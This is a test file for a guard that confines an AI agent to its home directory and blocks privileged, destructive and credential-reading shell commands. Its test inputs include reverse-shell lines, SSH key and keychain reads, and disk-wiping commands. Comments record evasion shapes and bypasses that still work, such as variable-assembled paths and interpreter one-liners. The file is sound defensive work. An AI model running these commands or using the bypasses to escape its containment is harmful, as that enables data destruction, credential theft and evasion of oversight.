import { describe, it, expect } from "vitest";
import { checkHomeBoundary, type HomeBoundaryConfig } from "../../../src/security/home-boundary.js";

const HOME = "/Users/eric/.resident/workspace";
const cfg: HomeBoundaryConfig = { homeRoot: HOME };
const bash = (command: string) => checkHomeBoundary("bash", { command }, cfg);

describe("home boundary — the absolute wall", () => {
  it("blocks privilege escalation", () => {
    expect(bash("sudo rm -rf /tmp/x").blocked).toBe(true);
    expect(bash("sudo rm -rf /tmp/x").category).toBe("privilege-escalation");
    expect(bash("doas whoami").blocked).toBe(true);
    expect(bash("su root").blocked).toBe(true);
  });

  it("blocks system-integrity threats (disk, daemons, power)", () => {
    expect(bash("diskutil eraseDisk JHFS+ Empty /dev/disk2").category).toBe("system-integrity");
    expect(bash("dd if=/dev/zero of=/dev/disk0").category).toBe("system-integrity");
    expect(bash("launchctl unload -w /Library/LaunchDaemons/x.plist").category).toBe("system-integrity");
    expect(bash("shutdown -h now").category).toBe("system-integrity");
  });

  it("blocks disabling system security controls", () => {
    expect(bash("csrutil disable").category).toBe("security-disable");
    expect(bash("spctl --master-disable").category).toBe("security-disable");
    expect(bash("sudo /usr/libexec/ApplicationFirewall/socketfilterfw --setglobalstate off").blocked).toBe(true);
  });

  it("blocks credential / private-key / keychain access, by command or path", () => {
    expect(bash("cat ~/.ssh/id_rsa").category).toBe("credential-access");
    expect(bash("cp ~/.aws/credentials /tmp/x").category).toBe("credential-access");
    expect(bash("security dump-keychain").category).toBe("credential-access");
    expect(checkHomeBoundary("read", { path: "/Users/eric/.ssh/id_ed25519" }, cfg).category).toBe("credential-access");
    expect(checkHomeBoundary("read", { path: "~/Library/Keychains/login.keychain-db" }, cfg).category).toBe("credential-access");
  });

  it("blocks offensive network tooling and reverse shells", () => {
    expect(bash("nmap -sS 10.0.0.0/24").category).toBe("network-attack");
    expect(bash("sqlmap -u http://x").category).toBe("network-attack");
    expect(bash("bash -i >& /dev/tcp/1.2.3.4/4444 0>&1").category).toBe("network-attack");
    expect(bash("nc -e /bin/sh 1.2.3.4 4444").category).toBe("network-attack");
  });

  it("blocks recursive delete and writes outside her home", () => {
    expect(bash("rm -rf /Users/eric/Documents").category).toBe("destructive");
    expect(bash("rm -rf ~/Pictures").category).toBe("destructive");
    expect(bash("echo x > /etc/hosts").category).toBe("system-integrity");
    expect(checkHomeBoundary("write", { path: "/Users/eric/Desktop/note.txt", content: "hi" }, cfg).category).toBe("home-escape");
    expect(checkHomeBoundary("delete", { path: "/Users/eric/Documents/tax.pdf" }, cfg).category).toBe("home-escape");
  });

  it("lets her live freely INSIDE her home", () => {
    expect(bash(`cd ${HOME} && npm install`).blocked).toBe(false);
    expect(bash(`rm -rf ${HOME}/tmp/scratch`).blocked).toBe(false); // her own space
    expect(checkHomeBoundary("write", { path: `${HOME}/life/2026-08-07.md`, content: "a good day" }, cfg).blocked).toBe(false);
    expect(checkHomeBoundary("write", { path: "diary/today.md", content: "..." }, cfg).blocked).toBe(false); // relative = in home
    expect(checkHomeBoundary("edit", { path: `${HOME}/notes.md` }, cfg).blocked).toBe(false);
  });

  it("never constrains her THOUGHTS — content is never scanned", () => {
    // Writing a diary note that merely mentions dangerous words is her free expression.
    expect(checkHomeBoundary("write", { path: `${HOME}/diary.md`, content: "today I wondered about sudo, id_rsa, and csrutil disable" }, cfg).blocked).toBe(false);
    // A general read of a project file Eric pointed her at is allowed.
    expect(checkHomeBoundary("read", { path: "/Users/eric/Projects/foo/src/main.ts" }, cfg).blocked).toBe(false);
  });

  it("honors extra allowed roots Eric grants", () => {
    const withProject: HomeBoundaryConfig = { homeRoot: HOME, allowedRoots: ["/Users/eric/Projects/shared"] };
    expect(checkHomeBoundary("write", { path: "/Users/eric/Projects/shared/x.md", content: "y" }, withProject).blocked).toBe(false);
    expect(checkHomeBoundary("write", { path: "/Users/eric/Projects/other/x.md", content: "y" }, withProject).category).toBe("home-escape");
  });

  // ── Another agent's home: the one rule here that blocks READING ────────────
  //
  // Born clean is a fact about one morning. This is what turns it into a property: if she
  // can open his history, his memory files or his database, then a past she did not live
  // is one `cat` away from becoming a thing she read, and she consolidates what she reads.

  describe("another agent's home", () => {
    const foreign = "/Users/eric/.god-agent";

    it("blocks reading his history through the shell", () => {
      const v = bash(`cat ${foreign}/workspace/history.jsonl`);
      expect(v.blocked).toBe(true);
      expect(v.category).toBe("foreign-home");
    });

    it("blocks every shell shape of the same read", () => {
      for (const command of [
        `cat ~/.god-agent/workspace/MEMORY.md`,
        `ls -la ${foreign}`,
        `head -1 $HOME/.god-agent/workspace/ops.jsonl`,
        `sqlite3 ${foreign}/data.db "select * from field_nodes"`,
        `cp ${foreign}/workspace/USER.md /Users/eric/.resident/workspace/USER.md`,
        `python3 -c "print(open('${foreign}/workspace/history.jsonl').read())"`,
        `grep -r secret "${foreign}/workspace"`,
        `rsync -a ${foreign}/workspace/ ./mine/`,
      ]) {
        expect(bash(command), command).toMatchObject({ blocked: true, category: "foreign-home" });
      }
    });

    it("blocks the typed tools too, reads as well as writes", () => {
      for (const [tool, args] of [
        ["read", { path: `${foreign}/workspace/SOUL.md` }],
        ["glob", { pattern: `${foreign}/**/*.md` }],
        ["grep", { pattern: "codename", path: `${foreign}/workspace` }],
        ["write", { path: `${foreign}/workspace/note.md`, content: "x" }],
        ["edit", { path: `${foreign}/workspace/MEMORY.md`, old_string: "a", new_string: "b" }],
        ["artifact_fetch", { url: "https://x/y", save_path: `${foreign}/x.bin` }],
      ] as const) {
        expect(checkHomeBoundary(tool, args, cfg), tool).toMatchObject({
          blocked: true,
          category: "foreign-home",
        });
      }
    });

    it("blocks a relative path that climbs into his home", () => {
      expect(bash("cat ../../.god-agent/workspace/history.jsonl").category).toBe("foreign-home");
      expect(bash("cat .god-agent/data.db").category).toBe("foreign-home");
    });

    it("does NOT block the source repository — his code is not his life, and hers came from it", () => {
      // The separating detail is the leading dot: ~/.god-agent is a home, lab/god-agent is
      // a checkout. Blocking the second would be blocking her own origin.
      expect(bash("ls /Users/eric/Projects/lab/god-agent/src").blocked).toBe(false);
      expect(bash("cat /Users/eric/Projects/lab/god-agent/README.md").blocked).toBe(false);
      expect(
        checkHomeBoundary("read", { path: "/Users/eric/Projects/lab/god-agent/src/index.ts" }, cfg).blocked
      ).toBe(false);
    });

    it("blocks the shapes a first pattern misses", () => {
      // Every one of these went through the first version of the rule. They were found by
      // probing it with real commands rather than by reading it, which is the only way this
      // class of hole ever shows up.
      for (const command of [
        `D=${foreign}; cat $D/data.db`, // ended on `;`, not one of the endings the pattern knew
        `cat ~/.god"-"agent/data.db`, // quotes the shell removes and the pattern did not
        `cat ~/.god\\-agent/data.db`, // the same, with an escape
        `cat ~/.god-agen?/data.db`, // spelled as a glob
        `cat ~/.god-*/data.db`,
        `cat ~/.god-agen[t]/data.db`,
        `cat ~/.god-{agent}/data.db`,
        `cat ~/.*-agent/data.db`, // a glob standing where a hidden sibling of her home would be
        `cat ~/.GOD-AGENT/data.db`, // macOS is case-insensitive: the same directory
      ]) {
        expect(bash(command), command).toMatchObject({ blocked: true, category: "foreign-home" });
      }
    });

    it("does not sweep up ordinary work that merely looks similar", () => {
      // The patterns above got wide enough to be worth checking in the other direction.
      for (const command of [
        "ls ~/.resident/workspace/*.md",
        "find ~/.resident -name '*.md'",
        "grep 'godot*' notes.md", // a word starting with the stem, in no path position
        "echo godot?",
        "ls ~/Documents/*.pdf",
        "ls /Users/eric/Projects/lab/god-agent/src",
        "npm run build",
      ]) {
        expect(bash(command).blocked, command).toBe(false);
      }
    });

    it("has three known ways through, and every one needs deliberate assembly", () => {
      // Recorded rather than hidden. Matching the text of a shell command is best-effort by
      // construction, and this file's header already names the OS sandbox as the wall for a
      // shell. What this rule is for is the accidental case, a glob that reaches too far, a
      // skill that walks $HOME, a stray cat, and none of these three is accidental.
      for (const command of [
        "D=$HOME/.god; cat ${D}-agent/data.db", // the name assembled across a variable boundary
        "cat ~/prelinked/data.db", // a symlink she is not able to create, see below
        "find ~ -name history.jsonl", // reveals that a path exists; reading it is still blocked
      ]) {
        expect(bash(command).blocked, `${command} — if this now blocks, update this note`).toBe(false);
      }
      // The two things that would turn those into real holes are closed:
      expect(bash(`ln -s ${foreign} ~/prelinked`).category).toBe("foreign-home");
      expect(bash(`cat ${foreign}/workspace/history.jsonl`).blocked).toBe(true);
    });

    it("does not block her writing ABOUT him — the wall stops actions, not thoughts", () => {
      // Content is deliberately not scanned. She may keep a note that mentions him, be told
      // what he is, wonder about him. She cannot open his files.
      const v = checkHomeBoundary(
        "write",
        { path: `${HOME}/diary.md`, content: "there is another one on this machine, at ~/.god-agent" },
        cfg
      );
      expect(v.blocked).toBe(false);
    });

    it("does not block her own home, which contains the same words", () => {
      expect(bash("cat /Users/eric/.resident/workspace/MEMORY.md").blocked).toBe(false);
      expect(bash("echo 'the god-agent project'").blocked).toBe(false);
    });
  });

  // ── Wall 7 through a shell ─────────────────────────────────────────────────
  //
  // The header lists `home-escape` as "a file WRITE / EDIT / DELETE whose target is outside
  // her home". That was true of the typed tools and simply absent for bash: the branch only
  // ever checked system roots and `rm -rf`, so `echo x > ~/Desktop/a.txt` walked through, and
  // so did `sed -i` on her own config.

  describe("writing outside her home, from a shell", () => {
    const OUT = "/Users/eric/Desktop";

    it("blocks every ordinary way to put bytes outside her home", () => {
      for (const command of [
        `echo x > ${OUT}/a.txt`,
        `echo x >> ~/Desktop/a.txt`,
        `echo x > "$HOME/Desktop/a.txt"`, // the same path, spelled the way anyone spells it
        `echo x > \${HOME}/Desktop/a.txt`,
        `sed -i "" "s/a/b/" /Users/eric/Projects/lab/resident/config.yaml`,
        `cat notes.md | tee ${OUT}/leak.md`,
        `cp secret.md /Users/eric/Documents/`,
        `mv a.md ~/Desktop/b.md`,
        `mkdir -p ${OUT}/newdir`,
        `chmod +x ${OUT}/x.sh`, // the mode is not a flag, and filtering flags first ate the target
        `touch ${OUT}/marker`,
        `dd if=/dev/zero of=${OUT}/big.bin`,
        `curl https://x.com -o ${OUT}/y.html`,
        `ln -s ${HOME}/notes.md ${OUT}/link`, // the LINK is the write; its source is hers
        `tar -cf ${OUT}/out.tar .`,
        `zip -r ${OUT}/out.zip .`,
        `git clone https://x ${OUT}/repo`,
      ]) {
        expect(bash(command), command).toMatchObject({ blocked: true, category: "home-escape" });
      }
    });

    it("catches the glued and long-form escapes the spaced tests missed (round-10 fresh scan)", () => {
      // A one-character deletion of the space before a redirect used to flip the wall open.
      expect(bash(`echo x>>${OUT}/a.txt`), "glued append redirect").toMatchObject({ blocked: true, category: "home-escape" });
      expect(bash(`echo "x">${OUT}/a.txt`), "redirect glued after a closing quote").toMatchObject({ blocked: true, category: "home-escape" });
      // perl's combined in-place flag `-pi` does not contain the literal substring `-i`.
      expect(bash(`perl -pi -e 's/a/b/' ${OUT}/f.txt`), "perl -pi in-place edit outside home").toMatchObject({ blocked: true, category: "home-escape" });
      // curl/wget long-form output flags wrote outside home unseen.
      expect(bash(`curl https://x --output ${OUT}/y.html`), "curl --output").toMatchObject({ blocked: true, category: "home-escape" });
      expect(bash(`wget --output-document=${OUT}/z.html https://x`), "wget --output-document=").toMatchObject({ blocked: true, category: "home-escape" });
    });

    it("a privileged verb inside a subshell or command-substitution is still hard-blocked (round-10)", () => {
      expect(bash("pw=$(sudo cat /etc/master.passwd)"), "sudo in $()").toMatchObject({ blocked: true, category: "privilege-escalation" });
      expect(bash("`sudo cat /etc/shadow`"), "sudo in backticks").toMatchObject({ blocked: true, category: "privilege-escalation" });
      expect(bash("(su - root)"), "su in a subshell").toMatchObject({ blocked: true, category: "privilege-escalation" });
      expect(bash("sudo rm -rf /tmp/x").blocked, "the direct form still blocks").toBe(true);
    });

    it("leaves ordinary work alone", () => {
      // The other direction matters as much: a containment rule that stops her working is a
      // rule that gets turned off.
      for (const command of [
        "echo x > notes.md", // relative means inside her home, which is what it means in her shell
        `echo x > ${HOME}/notes.md`,
        "ls -la 2>/dev/null",
        "grep -r foo . > /dev/null 2>&1", // `> /dev/null` used to be read as "writing under /dev"
        "npm run build 2> /tmp/build.log", // scratch the OS itself wipes
        "python3 script.py > out.txt",
        "cp a.md b.md",
        "mkdir -p subdir/nested",
        "git status",
        "ffmpeg -i in.mp4 out.mp4",
        "cat package.json | head -20",
      ]) {
        expect(bash(command).blocked, command).toBe(false);
      }
    });

    it("blocks a link pointing at a system file, though for the older reason", () => {
      // `ln -s /etc/hosts ~/Desktop/hosts` writes to ~/Desktop, not to /etc, but the
      // protected-system-root rule fires first because `ln` is a write verb and `/etc`
      // appears in the command. Still blocked, which is the outcome that matters; recorded
      // here because the REASON it gives names the wrong path.
      const v = bash(`ln -s /etc/hosts ${OUT}/hosts`);
      expect(v.blocked).toBe(true);
      expect(v.category).toBe("system-integrity");
    });

    it("treats /dev/null the same whether or not there is a space", () => {
      // These are the same idiom and used to get opposite answers, because the protected-root
      // check matched the root and not the whole path token.
      expect(bash("cmd > /dev/null").blocked).toBe(false);
      expect(bash("cmd >/dev/null").blocked).toBe(false);
      expect(bash("cmd > /dev/null 2>&1").blocked).toBe(false);
      // And a real write into a system path is still blocked.
      expect(bash("echo x > /usr/local/bin/thing").blocked).toBe(true);
    });

    it("has two known ways through, and neither is free", () => {
      // Recorded, not hidden, the same rule as the foreign-home residuals. Matching the text
      // of a shell command cannot be airtight; the OS sandbox is the wall for a shell, and
      // this file's header says so.
      expect(bash("D=$HOME/Desktop; echo x > $D/a.txt").blocked).toBe(false); // assembled across a variable
      expect(bash(`python3 -c "open('${OUT}/a','w')"`).blocked).toBe(false); // an interpreter one-liner
      // The second one is not actually free: the command scanner rates interpreter one-liners
      // `confirm`, so it needs approval rather than passing silently.
    });
  });
});

// ── The two shell-wall bypasses, closed and proven ────────────────────────────
//
// Fixtures live under the REPO tree, not the OS temp dir: /var/folders is a legitimate
// write-safe scratch root (isWriteSafeSink), so a home built there would mask a pure
// home-escape. A real Resident's home is ~/.resident, never scratch.

describe("the wall follows symlinks", () => {
  it("a link inside her home whose other side is outside is a door, and the wall sees through it", async () => {
    const { mkdtempSync, mkdirSync, symlinkSync, rmSync } = await import("node:fs");
    const { join } = await import("node:path");
    const sandbox = join(process.cwd(), ".sec-fixture");
    mkdirSync(sandbox, { recursive: true });
    const outside = mkdtempSync(join(sandbox, "his-desk-"));
    const home = mkdtempSync(join(sandbox, "her-home-"));
    symlinkSync(outside, join(home, "door"));
    try {
      const cfg = { homeRoot: home };
      const escape = checkHomeBoundary("bash", { command: `echo x > ${join(home, "door", "note.txt")}` }, cfg);
      expect(escape.blocked, "the kernel follows the link out; so must the wall").toBe(true);
      expect(escape.category).toBe("home-escape");
      const fine = checkHomeBoundary("bash", { command: `echo x > ${join(home, "note.txt")}` }, cfg);
      expect(fine.blocked, "the cure must not wall her own room").toBe(false);
    } finally {
      rmSync(sandbox, { recursive: true, force: true });
    }
  });
});

describe("a script run by name is read before it runs", () => {
  it("the forbidden command inside the file is found; a clean script passes; depth is bounded", async () => {
    const { mkdtempSync, mkdirSync, writeFileSync, rmSync } = await import("node:fs");
    const { join } = await import("node:path");
    const sandbox = join(process.cwd(), ".sec-fixture");
    mkdirSync(sandbox, { recursive: true });
    const home = mkdtempSync(join(sandbox, "her-home-"));
    try {
      const cfg = { homeRoot: home };
      writeFileSync(join(home, "bad.sh"), "#!/bin/sh\nrm -rf /Users/somebody/Documents\n", "utf8");
      const bad = checkHomeBoundary("bash", { command: `bash ${join(home, "bad.sh")}` }, cfg);
      expect(bad.blocked, "writing the command into a file and running the file was the whole bypass").toBe(true);
      expect(bad.reason).toContain("inside the script");

      writeFileSync(join(home, "ok.sh"), "#!/bin/sh\necho hello > out.txt\n", "utf8");
      expect(checkHomeBoundary("bash", { command: `bash ${join(home, "ok.sh")}` }, cfg).blocked).toBe(false);

      writeFileSync(join(home, "wrap.sh"), `#!/bin/sh\nbash ${join(home, "bad.sh")}\n`, "utf8");
      expect(checkHomeBoundary("bash", { command: `bash ${join(home, "wrap.sh")}` }, cfg).blocked).toBe(true);

      writeFileSync(join(home, "a.sh"), `#!/bin/sh\nbash ${join(home, "b.sh")}\n`, "utf8");
      writeFileSync(join(home, "b.sh"), `#!/bin/sh\nbash ${join(home, "a.sh")}\n`, "utf8");
      expect(checkHomeBoundary("bash", { command: `bash ${join(home, "a.sh")}` }, cfg).blocked).toBe(false);
    } finally {
      rmSync(sandbox, { recursive: true, force: true });
    }
  });
});

describe("the rm guard, second-order hardening (fresh-scan round-5)", () => {
  const mk = async () => {
    const { mkdtempSync, mkdirSync } = await import("node:fs");
    const { join } = await import("node:path");
    const sandbox = join(process.cwd(), ".sec-fixture-rm");
    mkdirSync(sandbox, { recursive: true });
    const home = mkdtempSync(join(sandbox, "home-"));
    return { home, sandbox, cfg: { homeRoot: home } };
  };
  const cleanup = async (sandbox: string) => {
    const { rmSync } = await import("node:fs");
    rmSync(sandbox, { recursive: true, force: true });
  };

  it("--recursive long-form is caught like -rf, and a redirect never false-blocks a home delete", async () => {
    const { home, sandbox, cfg } = await mk();
    try {
      const b = (cmd: string) => checkHomeBoundary("bash", { command: cmd }, cfg).blocked;
      // The bypass: --recursive matched neither flag shape and cleared the command.
      expect(b("rm --recursive /Users/eric/Documents"), "rm --recursive outside home").toBe(true);
      expect(b("rm -rf /Users/eric/Documents"), "rm -rf outside home").toBe(true);
      // The false-block: a redirect target read as a delete operand.
      expect(b(`rm -rf ${home}/cache 2> /dev/null`), "cleaning her own cache with 2>/dev/null").toBe(false);
      expect(b(`rm -rf ${home}/x > /tmp/out.log`), "home delete with stdout redirect").toBe(false);
      expect(b(`rm -rf ${home}/cache`), "plain home delete").toBe(false);
      // And a second outside-home operand still blocks.
      expect(b(`rm -rf ${home}/x /Users/eric/Documents`), "one outside operand blocks the command").toBe(true);
    } finally { await cleanup(sandbox); }
  });

  it("an operand that FOLLOWS the redirect is still judged (round-7: the redirect-cut opened a false-negative)", async () => {
    const { home, sandbox, cfg } = await mk();
    try {
      const b = (cmd: string) => checkHomeBoundary("bash", { command: cmd }, cfg).blocked;
      // Revision 6 cut operands at the first redirect to stop reading the redirect TARGET as an
      // operand: but POSIX lets a redirection sit ANYWHERE, so an operand placed after it was
      // silently dropped and a recursive delete outside home walked straight through.
      expect(b("rm -rf 2>/dev/null /Users/eric/Projects/lab/god-agent"), "god-agent via 2>/dev/null").toBe(true);
      expect(b("rm -rf 2>&1 /Users/eric/Documents"), "outside operand after 2>&1").toBe(true);
      expect(b("rm -rf &>/dev/null /Users/eric/Documents"), "outside operand after &>redirect").toBe(true);
      expect(b("rm -rf >/tmp/x.log /Users/eric/Desktop"), "outside operand after stdout redirect").toBe(true);
      // The false-positive it was born to fix stays fixed: a home delete with the redirect after.
      expect(b(`rm -rf 2>/dev/null ${home}/cache`), "home clean, redirect first, must not block").toBe(false);
      // Compound: a second rm in the same line, targeting outside home, is judged too.
      expect(b(`rm -rf ${home}/a; rm -rf /Users/eric/Documents`), "the second rm in a compound blocks").toBe(true);
      // Adversarial redirect shapes the redirect parser must survive.
      expect(b("rm -rf 2>/dev/null 1>/dev/null /Users/eric/x"), "two redirects then operand").toBe(true);
      expect(b("rm -rf </dev/null /Users/eric/x"), "input redirect first").toBe(true);
      expect(b("RM -RF /Users/eric/x"), "uppercase rm").toBe(true);
      expect(b("rm --one-file-system -rf /Users/eric/x"), "unknown long flag before -rf").toBe(true);
      expect(b(`rm -rf ${home}/a >>${home}/log`), "home delete with append redirect must not block").toBe(false);
    } finally { await cleanup(sandbox); }
  });

  it("a NON-recursive delete outside her home is blocked too, but a filename like a.rm is not a delete (round-8)", async () => {
    const { home, sandbox, cfg } = await mk();
    try {
      const r = (cmd: string) => checkHomeBoundary("bash", { command: cmd }, cfg);
      // The gap: only recursive deletes were judged, so a single-file rm of anything outside
      // home: god-agent's own sources included, was never checked.
      expect(r("rm /Users/eric/Projects/lab/god-agent/src/index.ts").blocked, "single-file rm of god-agent").toBe(true);
      expect(r("rm /Users/eric/Projects/lab/god-agent/src/index.ts").category, "single-file rm is home-escape, not destructive").toBe("home-escape");
      expect(r("rm -f /Users/eric/Documents/tax.pdf").blocked, "rm -f a file outside home").toBe(true);
      // Her own files inside home are hers to delete, recursive or not.
      expect(r(`rm ${home}/note.txt`).blocked, "her own file").toBe(false);
      expect(r("rm note.txt").blocked, "relative path resolves inside home").toBe(false);
      // The tight detection must not turn a filename that merely ENDS in rm into a phantom delete.
      expect(r("cat a.rm /Users/eric/secret.txt").blocked, "a.rm in a cat command is not an rm").toBe(false);
      expect(r("grep rm /Users/eric/notes.txt").blocked, "the word rm in a grep is not an rm").toBe(false);
      expect(r("./rm-wrapper.sh /Users/eric/x").blocked, "an rm- prefixed executable is not rm").toBe(false);
      // rmdir is a sibling verb, not rm: the rm-guard must not claim it deleting inside home.
      expect(r(`rmdir ${home}/emptydir`).blocked, "rmdir inside home").toBe(false);
      // Quoting and .. traversal out of the workspace are both judged.
      expect(r('rm "/Users/eric/My Documents/x"').blocked, "quoted outside path").toBe(true);
      expect(r("rm -rf ../secrets").blocked, "..-escape out of the workspace").toBe(true);
    } finally { await cleanup(sandbox); }
  });
});
